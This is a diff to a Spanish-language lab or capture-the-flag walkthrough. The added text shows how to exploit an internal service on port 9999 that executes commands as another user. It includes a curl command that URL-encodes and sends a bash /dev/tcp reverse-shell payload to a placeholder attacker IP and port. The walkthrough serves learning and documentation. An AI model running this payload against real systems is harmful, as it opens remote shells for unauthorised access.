@@ -118,8 +118,24 @@ curl "http://localhost:9999/cmd?id=id"
 
 ![curl al servicio interno: el id devuelve otro usuario](evidencia/curl9999.png)
 
-El servicio ejecuta lo que se le pasa y lo hace **como otro usuario**. Con una reverse shell se
-obtiene sesión interactiva:
+El servicio ejecuta lo que se le pasa y lo hace **como otro usuario**. Para la reverse shell el
+payload viaja como parámetro `cmd`, así que tiene que ir **codificado en URL**: sin codificar, el
+`&` y el `>` rompen la petición. Se codifica con el *Encoder* de Burp, o se deja que lo haga `curl`
+con `--data-urlencode`, que es lo que se ve en la grabación:
+
+```bash
+# equivalente: curl codifica el valor del parámetro
+curl -G http://localhost:9999/ --data-urlencode \
+  "cmd=bash -i >& /dev/tcp/<IP-atacante>/<puerto> 0>&1"
+```
+
+![El envío desde la terminal: la línea queda cortada por el ancho de la ventana](evidencia/revshell-curl.png)
+
+> En la grabación el comando completo no cabe en la terminal: se ve el arranque
+> (`curl -G http://localhost:9999/ --data-urlencode "cmd= …`) y justo después la conexión que
+> llega al escucha. El comando íntegro es el del bloque de arriba.
+
+Con el payload enviado, la reverse shell se queda escuchando:
 
 ```bash
 # en el atacante
